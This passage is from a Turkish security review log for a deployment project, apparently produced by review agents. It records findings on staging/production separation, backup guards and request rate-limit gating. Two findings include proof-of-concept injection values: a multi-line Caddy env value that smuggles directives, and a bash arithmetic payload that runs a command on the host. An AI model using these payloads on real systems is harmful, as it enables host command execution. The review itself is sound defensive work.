Sorun: Staging yedeğinin prod'dan ayrılması tamamen staging `backup.env`'inin doğru doldurulmasına bağlı. Runbook §21.3/7 doğru değerleri listeliyor ama kod zorlamıyor. Prod `backup.env`'i kopyalanıp düzenlenirse ya da anahtar unutulursa:

- `BACKUP_DIR=/var/backups/remote` kalırsa `BACKUP_KEEP_DAYS=3` ile staging koşusu **prod'un 3 günden eski yedeklerini siler** (14 günlük saklama 3 güne iner). Ayrıca prod `seq/prevRun` zinciri staging manifestleriyle karışır.
- `BACKUP_STATUS_FILE` eksikse staging, prod'un `status.prom` dosyasını yazar. Prod `remote-watch` (`remote-watch.sh:156,220-228`) staging'in başarılı zaman damgasını görür. Prod zamanlayıcısı hiç tetiklenmezse `backup-age` alarmı gelmez.
- `BACKUP_SIGNING_KEY` eksikse staging yedekleri prod anahtarıyla imzalanır. Prod `allowed_signers` bunları geçerli sayar. Geri yüklemede manifest env kilidi engelliyor ama ADR-0021'in "ayrı imza anahtarı" vaadi sessizce bozulur.
  Düzeltme: Şablon birim ortamı zorlasın (betikte "ortam dosyayı ezer" kuralı zaten var): `Environment=BACKUP_DIR=/var/backups/remote-%i BACKUP_STATUS_FILE=/var/lib/remote-backup-%i/status.prom BACKUP_SIGNING_KEY=/etc/remote-backup-%i/manifest_ed25519`. Aynı ortam `remote-backup-failed@.service`'e de verilmeli. Ek olarak `backup.sh`'ta `DEPLOY_ENV != production` iken `BACKUP_DIR`, `STATUS_FILE` ve `SIGN_KEY` prod varsayılan yollarındaysa durulsun (fail-closed). Bir de `rotate_runs` ve `PREV_M` seçimi, manifest `env`'i bu çalıştırmanınkinden farklı dizinleri atlasın. Atanan ajan: devops.

#### [DÜŞÜK] S13C-3 `verify-and-publish.sh` `DEPLOY_ENV` ayrıştırması fail-open — A04

Yer: `deploy/agent/verify-and-publish.sh:49`. `sed -n 's/^DEPLOY_ENV=//p' | tr -d "\"'\r"`.
Sorun: `DEPLOY_ENV=production  # prod` (satır içi yorum), `export DEPLOY_ENV=production` ya da `Production` gibi değerlerde `denv` `production` olmuyor. Bu durumda prod hedefine `run-…`, `dir-…`, `-unattested`, `-failedrun` etiketli exe yazılabilir. Aynı dosyada `backup.sh` bu değerlerde zaten başarısız olur (`lib.sh:163-168` `deploy_env_of`), yani durum görünür olur. Risk bu yüzden düşük.
Düzeltme: `lib.sh` içindeki `deploy_env_of` mantığını kullanın (ya da kopyalayın). Değer `development|staging|production` dışındaysa `die`. Atanan ajan: devops.

#### [DÜŞÜK] S13C-4 İki yığın aynı imaj adını/etiketini paylaşıyor — A08

Yer: `deploy/docker-compose.yml:57,70,89,149` (`remote-{migrate,server,web}:${IMAGE_TAG:-local}`), runbook §21.1 "İmajlar" satırı.
Sorun: Staging'de `docker compose build`, prod'un kullandığı etiketi aynı ada yeniden yazar. `IMAGE_TAG` boş kalırsa iki yığın da `:local` kullanır. O zaman staging'de derlenen (test edilecek commit) imaj, prod'da sonraki `up -d` ya da `verify-and-publish` server yeniden yaratmasında prod'a girer. Kısa SHA kuralı riski azaltıyor ama zorlamıyor. Prod geri alma ("önceki `IMAGE_TAG`") da staging'in yeniden derlediği imajı alabilir.
Düzeltme: `image: ${COMPOSE_PROJECT_NAME:-remote}-server:${IMAGE_TAG:-local}` (prod çıktısı değişmez: `remote-server`). Staging katmanında `IMAGE_TAG` `:?` ile zorunlu olsun. Atanan ajan: devops.

#### [DÜŞÜK] S13C-5 `remote-watch.sh install stg` staging ağacından çalıştırılınca prod ile paylaşılan kurulu kopyayı ezer — A08

Yer: `deploy/ops/remote-watch.sh:303-307` (`install … "$SELF" "$INSTALLED"`), runbook §21.3/8 (`/opt/remote-stg/deploy/ops/remote-watch.sh install stg`).
Sorun: `/usr/local/lib/remote/remote-watch.sh` prod ve stg örneklerinde ortak ve root olarak çalışıyor. Staging ağacı "test edilecek commit"te olabileceği için prod izleme kodu incelenmemiş/terfi etmemiş sürümle değişir. proxy-guard için runbook bilerek prod ağacını kullanıyor (§21.3/6). İzleme için de aynısı yapılmalı.
Düzeltme: Runbook §21.3/8 komutunu `/opt/remote/deploy/ops/remote-watch.sh install stg` yapın. Ya da `do_install_inst` yalnız şablon birimleri + `<örnek>.env` kursun, kurulu kopyaya dokunmasın. Atanan ajan: devops.

#### [DÜŞÜK] S13C-6 proxy-guard'ın 4461'i kapsadığı izlenmiyor — A05

Yer: `deploy/ops/remote-watch.sh` (proxy-guard kontrolü yok), runbook §21.3/6.
Sorun: Staging ayağa kalkar ama §21.3/6 atlanırsa (ya da §21.5 geri alma sonrası yanlış sırayla yeniden kurulursa) `127.0.0.1:4461`'e bağlanan her yerel süreç Caddy'ye `172.30.1.128` olarak görünür ve sahte `X-Forwarded-For` ile staging giriş limitlerini ve audit IP'sini atlatır. Bu sunucuda başka web servisleri (php-fpm vb.) de var. Hiçbir alarm bunu yakalamıyor. Yalnız staging verisi etkilenir.
Düzeltme: `remote-watch` (örnekte) `nft list table inet remote_proxy_guard` çıktısında kendi Caddy host portunun (`docker compose port caddy 4451` ya da `WATCH_PROXY_PORT`) bulunduğunu kontrol etsin. Yoksa `proxy-guard` ALERT. Atanan ajan: devops.

#### [BİLGİ] S13C-7 Caddyfile env yerleştirmesi direktif enjeksiyonuna açık; değer doğrulanmıyor

Yer: `deploy/Caddyfile:58`. Yerelde denendi: `CADDY_TRUSTED_PROXIES=$'172.30.1.128/32\n}\nservers :4450 {'` → adapt başarılı ve `:4450` sunucusuna `client_ip_headers`/`trusted_proxies_strict` taşındı. `0.0.0.0/0` de kabul ediliyor. Kaynak root 600 `.env` olduğu için saldırı yüzeyi yok (yazabilen zaten root). nginx XFF'i `$remote_addr` ile yeniden yazdığından geniş bir değer de yalnız proxy-guard dışı yerel süreçlere fayda sağlar. Öneri: runbook §21.3/3 kontrolüne `CADDY_TRUSTED_PROXIES` için `^172\.30\.[0-9]+\.128/32$` beklentisi yazılsın. İsteğe bağlı olarak `test-caddy.sh`'a da eklenebilir (devops, Sonra).

#### [BİLGİ] S13C-8 `workflow_dispatch` dal kısıtının asıl dayanağı yayın betiği

`agent-win.yml:167` main kontrolü, dispatch edilen dalın kendi workflow dosyasında. Yazma yetkili biri dalda bu satırı silip stg (ya da başka) adresli artifact üretebilir. Ama `verify-and-publish.sh --stg-run` `headBranch=main`, `event=workflow_dispatch`, `success`, `workflowName=agent-win` ve `gh attestation verify --source-ref refs/heads/main --signer-workflow …agent-win.yml --deny-self-hosted-runners` istiyor. Böyle bir artifact yayımlanamaz. Release job'u değişmedi (`agent-win` adını indiriyor, yalnız etiket push'u). `AGENT_SERVER_URL` yanlışlıkla stg adresine ayarlanırsa Release job'u artifact bulamayıp düşer (fail-closed). Ayrıca `concurrency` grubu main push ile ortak (`cancel-in-progress`): stg dispatch'i süren main push koşusunu iptal edebilir, bu yalnız erişilebilirlik etkisi. İşlem gerekmiyor.

#### [BİLGİ] S13C-9 `--dir` staging'e adres denetimsiz

`verify-and-publish.sh:55` `dir-*` etiketi staging'e izinli. Prod adresli bir exe `--dir` ile staging'e yazılırsa staging istemcisi prod'a bağlanır. Klasörde `build-meta.txt` varsa 1. satırın `STG_SERVER_URL` olduğu kontrol edilebilir (devops, Sonra).

#### [BİLGİ] S13C-10 shellcheck bu makinede kurulu değil

Değişen betikler (`verify-and-publish.sh`, `proxy-guard.sh`, `remote-watch.sh`, `test-caddy.sh`, `test-backup-inner.sh`) yerelde shellcheck'ten geçirilemedi. CI shellcheck adımının yeşil olduğu commit öncesi doğrulanmalı.

### Otomatik tarama çıktıları

- gitleaks v8.30.1 (`dir /repo/deploy /repo/.github --redact --config .gitleaks.toml`). Komut tüm çalışma ağacını taradı (216 MB). 13 bulgunun **hepsi** git-ignore'lu `apps/web/.next/` derleme çıktısında (`preview-props.json`, `prerender-manifest.json`, `.previewinfo`, `.rscinfo`, `server-reference-manifest.json`; Next.js önizleme/şifreleme anahtarları, `generic-api-key`). `deploy/`, `.github/`, `.env.example`, runbook ve implementation.md'de bulgu **0**. `.next` repoda değil (`git check-ignore apps/web/.next` → ignored). Yerel derleme artığı, işlem gerekmiyor.
- `git grep` gizli bilgi deseni (`deploy .github .env.example`): eşleşme yok.
- `deploy/.env`, `deploy/backup/backup.env` git-ignore'lu (`.gitignore:6,50`), git'te izlenmiyor.
- Yerel doğrulamalar: prod compose `config` diff 0; prod `caddy adapt` diff 0; staging katmanı + `CADDY_TRUSTED_PROXIES` yok → compose hata; proje adı yok → `name: remote` / `remote_agent_downloads` (S13C-1 kanıtı); `name: remote-stg` staging katmanına eklenince `COMPOSE_PROJECT_NAME`'siz `name: remote-stg`; `ROBOTS_NOINDEX=2` → Caddy açılmıyor; çok satırlı `CADDY_TRUSTED_PROXIES` → direktif enjeksiyonu (S13C-7).
- Bağımlılık değişikliği yok, `pnpm audit` bu turda tekrarlanmadı.

### Tasarımda vaat edilip kodda bulunmayanlar

- ADR-0021 / mimari-e11 §3.1 "staging ayrı imza anahtarı ve ayrı yedek dizini" vaadi kodda zorlanmıyor, yalnız `backup.env` içeriğine bırakılmış (S13C-2).
- §3.1 "Volume'lar `remote-stg_*` (otomatik ön ek)" yalnız `.env` satırına bağlı. Kodda bir güvence yok (S13C-1).

### Olumlu

- Workflow girdileri yalnız `env:` üzerinden kabuğa geçiyor. `server_url` `choice` ile ve betikte tam eşitlikle, `version` regex ile doğrulanıyor. `with:` alanlarına giren çıktılar (artifact/exe adı) regex'ten geçmiş değerler. Script injection yüzeyi yok.
- stg exe ayrı artifact adı (`agent-win-stg`) ve ayrı dosya adı taşıyor. Release job'u ve `--run` yolu ona erişemiyor. Attestation stg exe için de üretiliyor ve yayın betiği `--no-attestation` ile `--stg-run`'ı birlikte kabul etmiyor.
- Volume adı için sabit `remote_agent_downloads` yedeği kaldırılmış: çözülemezse dur.
- Prod çıktısı (compose ve Caddy JSON) bayt düzeyinde değişmedi. Staging'e özgü Caddy anahtarları ayrı katmanda.
- proxy-guard tek portta kural metni ve imzası birebir aynı. Çok portta `verify` her portu ayrı sınıyor. Port listesi en çok 4, sayısal ve ≤ 65535.
- `remote-watch` örnek adı regex'le sınırlı. Örnek `.env`'i root 600 kontrolünden geçiyor ve `source` edilmiyor. `WATCH_PUBLIC_HOST` örnekte zorunlu. Başarısız birimler ortamlar arasında ayrılıyor.
- Geri yükleme ortam kilidi iki yönde de testle güvenceye alınmış (`test-backup-inner.sh` bölüm H).

DURUM: GEÇTİ (Kritik 0 / Yüksek 0). S13C-1 ve S13C-2 (Orta) C3 kurulumundan **önce** devops'un düzeltmesi önerilir, çünkü ikisi de tek bir `.env`/`backup.env` satırı eksikliğinde prod'u etkiliyor. Düşük bulgular `docs/gereksinimler.md` §9'a "Sonra" olarak eklenmeli.

---

## P13c (kod kısmı) — kod turu 2

Tarih: 2026-11-15 · Kapsam: `docs/implementation.md` "P13c — devops düzeltme turu 1" (S13C-1/2/3/5). Kod değiştirilmedi, staging'e bağlanılmadı.
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 2 (S13C-4, S13C-6; "Sonra", değişmedi) / Bilgi 3 yeni

### Düzeltme doğrulaması

| Bulgu          | Kod                                                                                                                                                                                                                                                                                                               | Doğrulama                                                                                                                                                                                                                                                                                                                                               | Sonuç       |
| -------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------- |
| S13C-1 (Orta)  | `deploy/docker-compose.staging.yml:8` `name: remote-stg`. `verify-and-publish.sh:55-83` çözülen proje adı ↔ `DEPLOY_ENV` (`production` ⇒ `remote`, `staging` ⇒ `remote` değil), ad çözülemezse `die`                                                                                                              | Yerelde `docker compose config --no-interpolate` 1. satırı: (A) staging `.env`'de ne `COMPOSE_FILE` ne `COMPOSE_PROJECT_NAME` → `remote` → **ret**. (B) yalnız `COMPOSE_FILE` → `remote-stg`. (C) yalnız `COMPOSE_PROJECT_NAME` → `remote-stg`. (D) prod → `remote`. `deploy/agent/test-publish-lock.sh` → GEÇTİ (reddedilen hedeflere dosya yazılmadı) | **Kapandı** |
| S13C-2 (Orta)  | `remote-backup@.service:16-19` ve `remote-backup-failed@.service:43-46` `Environment=` ile `-%i` yolları (`load_env_file` ortamdaki değeri ezmiyor: `lib.sh` `[ -z "${!key+x}" ]`, yani birim değeri kazanıyor). `lib.sh:172-183` `nonprod_paths_guard`, `backup.sh:53-56` trap/status yazımından önce çağrılıyor | Fonksiyon tek başına sınandı: `production` → 0; `staging`/`development`/boş + prod `BACKUP_DIR` (sondaki `/` dahil) ya da varsayılan status/imza yolu → 1 ve hangi anahtar olduğu yazılıyor; üç ayrı yol → 0. `test-backup-inner.sh` bölüm I mevcut                                                                                                     | **Kapandı** |
| S13C-3 (Düşük) | `verify-and-publish.sh:55-57` `deploy_env_of` ile aynı ayrıştırma, `:80` bilinmeyen/boş → `die`                                                                                                                                                                                                                   | `DEPLOY_ENV=production # yorum` artık `production` değil ve bilinmeyen sayılıyor → ret (fail-closed). Test "DEPLOY_ENV satırı yok → ret" geçti                                                                                                                                                                                                          | **Kapandı** |
| S13C-5 (Düşük) | runbook §21.3/8 `/opt/remote/deploy/ops/remote-watch.sh install stg` + gerekçe                                                                                                                                                                                                                                    | Metin doğru                                                                                                                                                                                                                                                                                                                                             | **Kapandı** |

### `AGENT_PUBLISH_LEGACY_STAGING=1` istisnasının değerlendirmesi — **kabul edilebilir**

Gerekçe:

- Dar kapsamlı. Dört koşulun hepsi aynı anda gerekiyor: `DEPLOY_ENV=staging`, proje `remote`, hedefin root 600 `.env` dosyasında tam olarak `AGENT_PUBLISH_LEGACY_STAGING=1` (awk `$2` tam eşitlik; `1 # not` kabul edilmez) ve etiket `^v\d+\.\d+\.\d+$`.
- Yayımlanabilecek tek şey, prod ile aynı korumalı yoldan gelen Release exe'si: `--tag` ile `gh release download`, `--source-ref refs/tags/vX` attestation'ı, `agent-release` ortam onayı. Bu exe'ye gömülü `remote.noktabilisim.net`, §20.8 geri dönüşünde o yığının kendi adı. Yani istisna yanlış adrese bağlanan bir istemci üretmiyor.
- stg exe, `run-`, `dir-`, `-unattested` ve `-failedrun` etiketleri bu yoldan geçemiyor.
- Bayrak `DEPLOY_ENV=production`'da hiç okunmuyor. Yeniden terfide unutulsa bile etkisiz.
- Kalan teorik risk: Bayrak yanlışlıkla `/opt/remote-stg/.env`'e kopyalanır ve aynı dosyada **hem** `COMPOSE_FILE` **hem** `COMPOSE_PROJECT_NAME` eksik olursa, Release exe'si prod volume'una yazılır (prod'un zaten alacağı dosya). Asıl zarar `docker compose up -d --no-deps server` adımının prod server'ını staging `.env`'iyle yeniden yaratması olur. Üç bağımsız yapılandırma hatası gerekiyor, Bilgi düzeyi (S13C-11).

### Yeni gözlemler (Bilgi)

- **S13C-11** Legacy bayrağı için ek sertleştirme (isteğe bağlı, devops, Sonra): istisnada ek olarak `dir` = `/opt/remote/deploy` şartı aranabilir. `DEPLOY_ENV=production` hedefte bayrak görülürse uyarı basılabilir. Runbook §20 yeniden terfi adımında "bayrağı sil" maddesi yer alabilir.
- **S13C-12** `nonprod_paths_guard` metin karşılaştırması yapıyor. `/var/backups//remote` ya da `/var/backups/remote/.` gibi eşdeğer yazımlar yakalanmıyor. Şablon birim yolları zorladığı için pratikte yalnız elle `backup.sh` çağrısında önemli. İsteğe bağlı: `realpath -m` ile normalize edilebilir (devops, Sonra).
- **S13C-13** Dağıtım sırası uyarısı: guard, `DEPLOY_ENV=staging` olan ve prod varsayılan yollarını kullanan **mevcut** bir kurulumda (P13c öncesi `/opt/remote` hâlâ staging ise ya da §20.8 geri dönüşü yapıldıysa) yedeği durdurur. Fail-closed ve görünür: birim başarısız olur, `OnFailure` alarmı gelir. Runbook §20.8 (a) bu yolları tarif ediyor. Bu değişiklik sunucuya alınmadan önce `/opt/remote/deploy/.env` `DEPLOY_ENV` değerine bakılmalı.

### Otomatik / yerel çıktılar

- `bash deploy/agent/test-publish-lock.sh` → SONUÇ: GEÇTİ.
- Proje adı çözümü dört `.env` biçimiyle yerelde sınandı (yukarıdaki tablo).
- `nonprod_paths_guard` beş girdiyle tek başına sınandı.
- Bağımlılık ve sır değişikliği yok. gitleaks/audit tekrarlanmadı (değişen dosyalar betik, birim ve runbook).

### Açık kalanlar

- S13C-4 (Düşük, ortak imaj adı/etiketi) ve S13C-6 (Düşük, proxy-guard 4461 izlemesi) devops tarafından "Sonra" olarak bırakıldı. `docs/gereksinimler.md` §9'da yer almaları gerekiyor. C3 kurulumunda runbook §21.3/6 (proxy-guard iki port) elle doğrulanmalı.

DURUM: GEÇTİ (Kritik 0 / Yüksek 0; Orta 0).

---

## P13c (kod kısmı) — kod turu 3

Tarih: 2026-11-15 · Kapsam: `docs/implementation.md` "P13c — devops düzeltme turu 2" (S13C-13 regresyonu, legacy bayrağının kaldırılması). Kod değiştirilmedi.
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 0 yeni / Bilgi 2 yeni (S13C-4, S13C-6 Düşük "Sonra" olarak açık)

### 1. `nonprod_paths_guard` ölçütü (`deploy/backup/lib.sh:178-193`, `backup.sh:53-56`) — **güvenli**

- İki ölçüt var, biri yetiyor. (1) `BACKUP_UNIT_NAME=remote-backup@…`: şablon birim `Environment=` ile veriyor ve aynı birim yolları da zaten `-%i`'ye zorluyor. (2) Compose proje adı `remote` değil.
- Proje adı çözülemezse ikinci yığın sayılıyor (fail-closed).
- `BACKUP_PRIMARY_PROJECT` `BACKUP_ENV_KEYS` içinde değil (`lib.sh:9-10`). `backup.env` üzerinden ölçüt gevşetilemiyor, yalnız süreç ortamından verilebiliyor (root).
- Gerçek ikinci yığın (`remote-backup@stg`) iki bağımsız katmanla korunuyor: zorlanan yollar ve şablon ölçütü. Önceki turun asıl riski (S13C-2) kapalı kalıyor.
- Tek yığın staging (bugünkü `/opt/remote`, şablonsuz birim, proje `remote`) prod yollarıyla yedek almaya devam ediyor. S13C-13 regresyonu giderildi.
- **Kalan dar boşluk (S13C-14, Bilgi):** Bu senaryo için üç koşul birlikte gerekiyor. (a) İkinci yığın `.env`'inde **hem** `COMPOSE_FILE` **hem** `COMPOSE_PROJECT_NAME` eksik, yani proje `remote`. (b) `backup.sh` şablon birim dışında elle çalıştırılıyor. (c) Staging `backup.env` prod yollarını taşıyor. Bu durumda guard geçer. Ama bu durumda `docker compose ps` zaten **prod** MySQL'ini bulur, yani yığın kurulumda prod'u ele geçirmiş olurdu. Sorun yedek guard'ından önce, kurulumda görünür. İsteğe bağlı sertleştirme: proje `remote` iken `.env` `PUBLIC_BASE_URL`/`SITE_HOST` `stg.` ile başlıyorsa ikinci yığın sayılsın (sırsız ve ucuz). devops, Sonra.

### 2. Bayraksız tek yığın staging yayını (`verify-and-publish.sh:66-75`) — **güvenli**

- `DEPLOY_ENV=staging` ve proje `remote` olduğunda yalnız `^v\d+\.\d+\.\d+$` kabul ediliyor. `run-`, `stg-`, `dir-`, `-unattested` ve `-failedrun` reddediliyor. `test-publish-lock.sh` yeniden koşuldu: GEÇTİ.
- Bu yoldan geçebilen tek şey Release exe'si. Prod ile aynı korumalı zincirden geliyor (etiket, `agent-release` onayı, `--source-ref refs/tags/vX` attestation'ı). Gömülü adres tek yığın sunucunun kendi adı. Bayrağın kaldırılması korumayı zayıflatmadı, çünkü önceki turda bayrağın açtığı küme de tam olarak buydu. Unutulacak/sızacak bir ayar da artık yok.
- **Kalan dar boşluk (S13C-15, Bilgi):** S13C-14'teki çift eksik yapılandırmada, yanlış kurulmuş ikinci yığına `--tag` ile yayın yapılırsa iki şey olur. Release exe'si prod volume'una yazılır (prod'un da kabul ettiği sınıftan bir dosya). Ayrıca `docker compose up -d --no-deps server` prod server'ını staging `.env`'iyle yeniden yaratır. Ön koşul yine yığının kurulumda prod'u ele geçirmiş olması. Aynı sertleştirme burada da işe yarar: proje `remote` + `PUBLIC_BASE_URL` = `STG_SERVER_URL` ise `die`. devops, Sonra.

### Otomatik / yerel çıktılar

- `bash deploy/agent/test-publish-lock.sh` → SONUÇ: GEÇTİ.
- Bağımlılık ve sır değişikliği yok.

DURUM: GEÇTİ (Kritik 0 / Yüksek 0 / Orta 0). S13C-14/15 (Bilgi), S13C-4 ve S13C-6 (Düşük) `docs/gereksinimler.md` §9 "Sonra" listesinde izlenmeli.

---

## P13c (kod kısmı) — kod turu 4

Tarih: 2026-11-15 · Kapsam: `docs/implementation.md` "P13c — devops düzeltme turu 3" (SIGPIPE: boru → here-string/awk; S13C-14/15 `stg_name_guard`). Kod değiştirilmedi.
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 0 yeni / Bilgi 1 yeni

### 1. SQL'in değişkene alınıp here-string ile verilmesi — **risk yok**

- `lib-audit.sh` (audit-continuity), `restore.sh` (`reset_sql`) ve `lib-restore.sh` (4 sabit sorgu). SQL metni ve içine giren değerler öncekiyle aynı.
  - `pday`/`puntil` tarih regex'iyle doğrulanıyor (`lib-audit.sh:46-47`), uymazsa boşaltılıyor.
  - `DB_NAME` imza doğrulamasından sonra `^[A-Za-z0-9_]{1,64}$` ile kontrol ediliyor (`restore.sh:112-113`).
  - Öteki dört sorgu sabit metin.
  - Yeni enjeksiyon yüzeyi oluşmadı.
- **argv/ps:** SQL komut satırı argümanı olarak geçmiyor. `<<<` stdin'e veriliyor (bash geçici dosya ya da boru kullanır), dolayısıyla `ps`'te görünmüyor. SQL metninde sır da yok. Parolalar eskisi gibi konteyner ortamından okunuyor. `backup` birimleri `PrivateTmp=true` + `UMask=0077` ile çalıştığı için olası geçici dosya da başka süreçlere kapalı.
- Davranış farkı yok: `$(…)` sondaki satır sonunu atıyor, here-string tek `\n` geri ekliyor. Son ifade `;` ile bittiği için mysql istemcisi sorguyu aynı biçimde çalıştırıyor. `test-backup.sh` 3 ardışık koşuda 73/73 sonucu (implementation.md) bunu destekliyor.

### 2. `verify_manifest_sig` (`lib.sh:247-259`) — **zayıflama yok**

- Tek değişiklik `| head -n 1` → `| awk 'NR == 1'`. İkisi de "ilk satır" seçiyor, anlam aynı. awk girdinin tamamını okuduğu için `ssh-keygen` SIGPIPE almıyor. Önceki sürümün bu yüzden ara sıra **yanlış FAIL** verme riski kalktı. Bu, kullanılabilirlikle ilgili bir düzeltme. Güvenlik yönünde etkisi yok, çünkü SIGPIPE yalnız reddetmeye yol açıyordu.
- Hata yolları korunuyor: `restore.sh:34` `set -euo pipefail`, yani `ssh-keygen find-principals` başarısızsa boru hattı yine sıfırdan farklı döner ve `|| return 1` çalışır. Principal regex'i değişmedi. Asıl kriptografik kontrol hâlâ ayrı `ssh-keygen -Y verify -I "$principal" -n remote-backup` çağrısı ve dönüş kodu değişmedi. Parmak izi boşsa `return 1`.

### 3. `stg_name_guard` (S13C-14/15) — **kapandı**

- `lib.sh:180-191` ve `backup.sh:57` (`--alert` dışında, trap/status yazımından önce). `verify-and-publish.sh:61-69` aynı kuralı uyguluyor: proje `remote` ve `PUBLIC_BASE_URL` host'u ya da `SITE_HOST` `stg.` ile başlıyorsa dur.
- `.env` source edilmiyor. Yalnız iki anahtar satırı awk ile okunuyor, sır okunmuyor. Proje adı sırsız çözülüyor (`compose_project_of`, `config --no-interpolate`).
- Prod (`remote.noktabilisim.net`) ve tek yığın staging etkilenmiyor. Gerçek ikinci yığın (proje `remote-stg`) bu guard'ı atlıyor ve `nonprod_paths_guard` kapsamında kalıyor.
- `bash deploy/agent/test-publish-lock.sh` → SONUÇ: GEÇTİ (24/24).
- **S13C-16 (Bilgi):** Eşleşme büyük/küçük harfe duyarlı ve yalnız `stg.` önekini tanıyor. `STG.remote…` ya da başka bir staging adı (ör. `staging.`) yakalanmaz. Adlandırma runbook §21'de sabit olduğu için pratik etkisi yok. İsteğe bağlı: küçük harfe çevirip karşılaştırmak (devops, Sonra).

DURUM: GEÇTİ (Kritik 0 / Yüksek 0 / Orta 0). S13C-14/15 kapandı. Açık kalanlar: S13C-4, S13C-6 (Düşük) ve S13C-11/12/16 (Bilgi), `docs/gereksinimler.md` §9 "Sonra".

## P14a/P14b (backend+db+devops) — kod turu 1

DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 2 / Düşük 6

Kapsam: `git diff` (taban b2e5771, `apps/web` hariç) + izlenmeyen yeni dosyalar; mimari-e11 §4–§5, implementation.md
"P14a A0", "A1/B1", "A5", "A3", "A2 + P14b B2" (sapmalar 1–9 dahil). Kod değiştirilmedi.

### Bulgular (öncelik sırasıyla)

#### [ORTA] S14-1 `/requests`: kapı IP kovalarından önce — kilitli IP ortak kapıyı (toplam 4) doldurabiliyor — A04/A05 (DoS)

Yer: `apps/server/src/requests/service.ts` `create()` — `admit` kapanışı ve `peeked ? await this.gated(peeked.tenantId, admit) : await admit()` (~s. 290–442)
Sorun: AC-209 için IP/önek/net48 kovaları, zod, consent/networkSeen/deviceSeen sorguları artık `gate.run` İÇİNDE. Önceden
kilitli IP 429'u kapıya girmeden alıyordu; şimdi her isteği önce kapı yuvası (tenant başına 2, toplam 4) veya kuyruk yeri tutuyor.
İstismar: geçerli tek bir talep bağlantısı (ref herkese dağıtılan müşteri linki) bilen saldırgan, IP'si zaten kilitliyken yüksek
paralellikte POST atar; her istek kısa süre de olsa yuva/kuyruk tutar → meşru müşteriler (tüm tenant'larda, `global=4`) 503
NOT_READY alır. Kova 503'te tüketilmediği için saldırganın maliyeti de düşmez.
Düzeltme: kapıdan ÖNCE sayımsız ön kontrol (`blockedFor` ile ip/önek/net48 kilitliyse 429; `hit` kapı içinde kalabilir), böylece
AC-209 "503'te kova tüketilmez" korunur, kilitli istemci kapıya hiç girmez. Entegrasyon testi: kilitli IP'den 50 paralel istek
sırasında başka IP'nin talebi 201. (atanan: backend-dev)

#### [ORTA] S14-2 remote-watch: metrik çıktısı bash aritmetiğine doğrulanmadan giriyor (konteyner → host root) — A03 (Injection)

Yer: `deploy/ops/remote-watch.sh:245-248` (`read -r r_last …`; `[ $((NOW - r_last)) -ge 93600 ]`)
Sorun: `r_last` server konteynerindeki `node`/`/metrics` çıktısından gelir, yalnız `${r_last%.*}` uygulanır. Bash aritmetiğinde
değişkenin değeri ifade olarak değerlendirilir; `a[$(komut)]` komut ikamesi çalıştırır. Yerelde doğrulandı:
`r_last='a[$(echo PWNED >&2)]'; $((NOW - r_last))` → `PWNED`. A5 bu satırı değiştirdi (yeni alanlar `num()` ile doğru
süzülüyor); açık P13'ten kalma.
İstismar: server konteynerinde kod çalıştırabilen saldırgan (`node` ikilisini/`/metrics` yanıtını değiştirerek) ilk alana yük
koyar; root olarak çalışan timer, konteyner 26 saatten uzun ayaktaysa (`&&` kısa devresi sonrası) hostta komut çalıştırır.
Düzeltme: okumadan hemen sonra `[[ "$r_last" =~ ^[0-9]+$ ]] || r_last=yok` (ve `r_fail` için aynı); `st_epoch` de sayı
denetiminden geçsin. test-watch.sh'ye yük içeren negatif test. (atanan: devops)

#### [DÜŞÜK] S14-3 MySQL testi: tek etiketli ad genel IP'ye çözülse de `allowPublicKeyRetrieval` açılıyor — A02

Yer: `apps/server/src/settings/mysql-probe.ts` `connectionOptions()` — `localish = cls === "loopback" || cls === "private" || SINGLE_LABEL.test(name)`
Sorun: resolv.conf arama alanı/ndots ile `db` gibi tek etiketli ad genel bir adrese çözülebilir; o durumda TLS'siz bağlantıda
açık anahtar isteği açık kalır (MITM sahte anahtarla şifreyi alabilir). `cls` zaten hesaplanmış.
Düzeltme: `localish = cls === "loopback" || cls === "private"` (tek etiket ancak çözülen adresler genel değilse). (backend-dev)
Not: rebinding koruması ve sertifika doğrulaması doğru — bağlantı `classifyHost`'un döndürdüğü IP'ye gidiyor,
`checkServerIdentity(name, cert)` ayardaki adla (IP literalinde IP ile) yapılıyor, `requireTls` iken `allowPublicKeyRetrieval:false`.

#### [DÜŞÜK] S14-4 Tenant pasife alma: eşzamanlı talep oluşturma hâlâ pasif tenant'a PENDING yazabilir — A04

Yer: `apps/server/src/tenants/repo.ts` `cancelTenantRequests` ↔ `requests/service.ts` oluşturma TX'i (`lockSettings` sonrası tenant durumu yeniden okunmuyor)
Sorun: ön bakışta tenant aktif görülür; pasife alma commit olunca bekleyen INSERT (gap kilidi kalkınca) geçer → AC-205'in "aynı
commit" niyetine rağmen pasif tenant'ta PENDING kalır (30 sn süpürücü kapatır). Kilit sırası incelendi: deadlock yok
(pasife alma: tenants X → support_requests; oluşturma: tenant_request_settings X → INSERT).
Düzeltme: oluşturma TX'inde `lockSettings`'ten sonra `SELECT status FROM tenants WHERE id=? FOR SHARE`; PASSIVE → tek 404
yolu. Sıra settings → tenants, pasife alma tenants'ı tutar ama settings'i istemez → döngü oluşmaz. (backend-dev)

#### [DÜŞÜK] S14-5 Kullanıcı yazımında 409/404 yetki kararından önce — 403 audit'i kaçabiliyor — A09

Yer: `apps/server/src/users/service.ts` `updateUser` (`if (cur.version !== expectedVersion) throw stale();` → sonra `assertManage`)
Sorun: üstün hesabı düzenlemeye çalışan Admin eski/yanlış sürümle gelirse 409 alır, AC-204 `denied` audit'i yazılmaz.
Düzeltme: `assertManage` ve kendi hesabı kontrolünü sürüm karşılaştırmasından önce yap. (backend-dev)

#### [DÜŞÜK] S14-6 `rs_guest_code_rate_limited_total` her reddedilen istekte artıyor; doküman "kilitli kova başına bir" diyor — A09

Yer: `apps/server/src/sessions/public.ts` `assertLookupAllowed` (`if (prefixWait > 0) limits.codeLimited("prefix")`)
Sorun: kilitliyken yeniden deneyen tek istemci sayacı istek başına artırır; `WATCH_GUEST_PREFIX_MAX=20` alarmı tek kişiyle
